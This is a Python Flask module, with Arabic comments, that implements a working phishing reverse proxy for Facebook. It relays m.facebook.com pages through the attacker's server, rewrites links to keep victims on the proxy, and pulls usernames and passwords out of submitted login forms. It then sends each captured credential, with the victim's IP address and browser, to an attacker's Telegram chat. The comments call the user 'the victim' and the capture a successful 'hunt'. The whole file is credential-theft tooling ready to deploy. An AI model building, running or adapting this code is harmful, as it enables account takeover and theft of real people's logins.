import os
import requests
import re
from urllib.parse import urljoin, urlparse, quote, unquote, urlencode
from flask import Blueprint, request, Response, redirect

def rewrite_urls(html_content, base_url, proxy_base_path):
    # دالة لتعديل الروابط النسبية لتبقى داخل النطاق الوهمي
    html_pattern = re.compile(
        r'(<[a-zA-Z0-9_-]+)\s+([^>]*?\b(?:href|src|action|data-uri|data-jsid))\s*=\s*(["\'])(.*?)\3',
        re.IGNORECASE | re.DOTALL
    )

    def replace_html_url(match):
        tag, attr, quote_char, original_url = match.groups()
        if not original_url or original_url.startswith(('data:', 'javascript:', '#', 'mailto:')):
            return match.group(0)
        
        temp_proxy_base_path = proxy_base_path.split('?id=')[0] if '?id=' in proxy_base_path else proxy_base_path
        if temp_proxy_base_path in original_url:
            return match.group(0)

        absolute_url = urljoin(base_url, original_url)
        proxied_url = f"{proxy_base_path}&url={quote(absolute_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_url)}"
        
        return f'{tag} {attr}={quote_char}{proxied_url}{quote_char}'

    return html_pattern.sub(replace_html_url, html_content)

def get_real_facebook_url(request_path, query_string):
    if 'url' in query_string:
        return unquote(query_string.get('url'))
    
    clean_args = {k: v for k, v in query_string.items() if k != 'id'}
    query_str = f"?{urlencode(clean_args)}" if clean_args else ""
    return f"https://m.facebook.com{request_path}{query_str}"

def save_credentials_to_db(platform, username, password, ip_address, user_agent, target_chat_id, bot):
    alert_msg = (
        f"🚨 **تم التقاط صيد {platform} بنجاح!**\n"
        "----------------------------------\n"
        f"📌 **البريد/الهاتف:** `{username}`\n"
        f"🔑 **كلمة المرور:** `{password}`\n"
        f"🌐 **عنوان الـ IP:** `{ip_address}`\n"
        f"🌍 **المتصفح:** `{user_agent}`\n"
        "----------------------------------"
    )
    try:
        bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] Telegram Dispatch Error: {e}")

def init_facebook_routes(app, bot):
    @app.route('/login.php', methods=['GET', 'POST'])
    @app.route('/home.php', methods=['GET', 'POST'])
    @app.route('/<path:subpath>', methods=['GET', 'POST'])
    def fb_proxy_router(subpath=''):
        target_chat_id = request.args.get('id', None)
        real_fb_url = get_real_facebook_url(request.path, request.args)
        
        base_endpoint = f"/{subpath}" if subpath else request.path
        proxy_base_path = f"{request.url_root.rstrip('/')}{base_endpoint}"
        if target_chat_id:
             proxy_base_path += f"?id={target_chat_id}"

        try:
            # معالجة بيانات الـ POST فور وصولها من الضحية
            if request.method == 'POST':
                form_data = request.form.to_dict()
                username = None
                password = None
                
                # فحص شامل لجميع حقول النموذج المستلمة لاستخراج البيانات مهما كانت تسميتها
                for key, val in form_data.items():
                    key_lower = key.lower()
                    if any(k in key_lower for k in ['email', 'user', 'phone', 'login', 'account', 'mail', 'identifier']):
                        username = val
                    elif any(k in key_lower for k in ['pass', 'pwd', 'password', 'secret', 'key']):
                        password = val

                # مراجعة احتياطية مباشرة للأسماء الشائعة في فيسبوك
                if not username:
                    username = request.form.get('email') or request.form.get('pass') or request.form.get('phone') or request.form.get('identifier')
                if not password:
                    password = request.form.get('pass') or request.form.get('password') or request.form.get('lsd')

                source_ip = request.headers.get('CF-Connecting-IP') or \
                            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or \
                            request.remote_addr
                user_agent = request.headers.get('User-Agent', 'Unknown')

                # إذا وجدنا اسم المستخدم، يتم إرساله فوراً إلى تليجرام
                if username and target_chat_id:
                    save_credentials_to_db("Facebook", username, password or "غير متاح", source_ip, user_agent, target_chat_id, bot)

            headers_to_forward = {
                k: v for k, v in request.headers if k.lower() not in [
                    'host', 'content-length', 'cookie', 'x-forwarded-for', 
                    'x-real-ip', 'cf-connecting-ip', 'connection', 'proxy-connection', 'accept-encoding'
                ]
            }
            headers_to_forward['Host'] = urlparse(real_fb_url).netloc
            headers_to_forward['User-Agent'] = request.headers.get("User-Agent", "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36")
            headers_to_forward['Accept-Encoding'] = 'identity'
            
            cookies_to_forward = request.cookies.to_dict()

            if request.method == 'POST':
                proxied_response = requests.post(
                    url=real_fb_url,
                    headers=headers_to_forward,
                    data=request.form,
                    cookies=cookies_to_forward,
                    allow_redirects=False,
                    timeout=15
                )
            else:
                proxied_response = requests.get(
                    url=real_fb_url,
                    headers=headers_to_forward,
                    cookies=cookies_to_forward,
                    allow_redirects=False,
                    timeout=15
                )
            
            content_type = proxied_response.headers.get("Content-Type", "").lower()
            
            if "text/html" not in content_type:
                resp = Response(proxied_response.content, status=proxied_response.status_code, content_type=content_type)
                for cookie_name, cookie_value in proxied_response.cookies.items():
                    resp.set_cookie(cookie_name, cookie_value)
                return resp

            html_content = proxied_response.content.decode('utf-8', errors='ignore')
            modified_html = rewrite_urls(html_content, real_fb_url, proxy_base_path)
            
            response = Response(modified_html, status=proxied_response.status_code)
            
            for key, value in proxied_response.headers.items():
                if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'location', 'host', 'content-type', 'set-cookie']:
                    response.headers[key] = value
            
            response.headers['Content-Type'] = 'text/html; charset=utf-8'

            for cookie_name, cookie_value in proxied_response.cookies.items():
                response.set_cookie(cookie_name, cookie_value)

            if proxied_response.status_code in (301, 302, 307, 308) and 'Location' in proxied_response.headers:
                original_location = proxied_response.headers['Location']
                absolute_redirect_url = urljoin(real_fb_url, original_location)
                proxied_redirect_url = f"{proxy_base_path}&url={quote(absolute_redirect_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_redirect_url)}"
                response.headers['Location'] = proxied_redirect_url
            
            return response

        except Exception as e:
            print(f"[-] Facebook Proxy Error: {e}")
            return redirect("https://m.facebook.com/login.php", code=302)
